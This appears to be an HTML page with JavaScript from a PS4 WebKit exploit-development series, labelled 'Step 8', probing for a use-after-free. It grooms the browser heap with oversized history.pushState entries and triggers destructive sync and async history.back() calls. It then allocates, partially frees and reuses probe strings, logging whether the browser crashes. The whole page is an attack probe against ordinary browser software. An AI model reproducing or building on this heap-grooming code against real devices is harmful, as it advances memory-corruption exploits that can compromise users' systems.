<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Step 8 Heap Probe</title>
<style>
body { font-family: monospace; background: #000; color: #0f0; }
button { font-size: 16px; padding: 10px; }
#log { white-space: pre-wrap; margin-top: 10px; }
</style>
</head>

<body>
<h2>PS4 WebKit – Step 8 (Heap Probe / UAF Detection)</h2>
<button onclick="run()">RUN STEP 8</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m) {
    logEl.textContent += m + "\n";
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function run() {
    log("[*] STEP 8 START");

    const BASE = 977;
    const STEP = 14461;
    let size = BASE;

    try {
        // -----------------------------
        // FASE 1 – Grooming estável
        // -----------------------------
        log("[1] Grooming history");
        for (let i = 0; i < 35; i++) {
            const payload = "A".repeat(size);
            history.pushState({}, "", "#g_" + payload);
            size += STEP;
        }
        log("[1] Grooming done");

        // -----------------------------
        // FASE 2 – Back destrutivo
        // -----------------------------
        log("[2] History back (sync + async)");
        for (let i = 0; i < 8; i++) {
            history.back();
        }

        await sleep(30);

        for (let i = 0; i < 4; i++) {
            setTimeout(() => history.back(), 0);
        }

        log("[2] Back scheduled");

        await sleep(50);

        // -----------------------------
        // FASE 3 – Heap probe leve
        // -----------------------------
        log("[3] Heap probe (small predictable allocs)");

        let probes = [];
        for (let i = 0; i < 40; i++) {
            // padrões diferentes para detectar uso indevido
            probes.push("P" + i + "_".repeat(256));
        }

        log("[3] Probes allocated");

        // -----------------------------
        // FASE 4 – Uso indireto (crítico)
        // -----------------------------
        log("[4] Indirect usage phase");

        // concatenação força leitura
        let mix = probes[5] + probes[12] + probes[20];
        log("[4] String mix length = " + mix.length);

        // structured clone leve
        window.postMessage({ data: probes[10] }, "*");
        log("[4] postMessage sent");

        // -----------------------------
        // FASE 5 – Liberação parcial
        // -----------------------------
        log("[5] Partial release");
        probes.splice(0, 20);

        await sleep(50);

        // novo uso após liberação parcial
        let mix2 = probes[0] + probes[5];
        log("[5] Post-release mix length = " + mix2.length);

        log("[*] STEP 8 FINISHED WITHOUT CRASH (VERY INTERESTING)");

    } catch (e) {
        log("[!] JS Exception: " + e);
    }
}

log("Ready.");
</script>
</body>
</html>

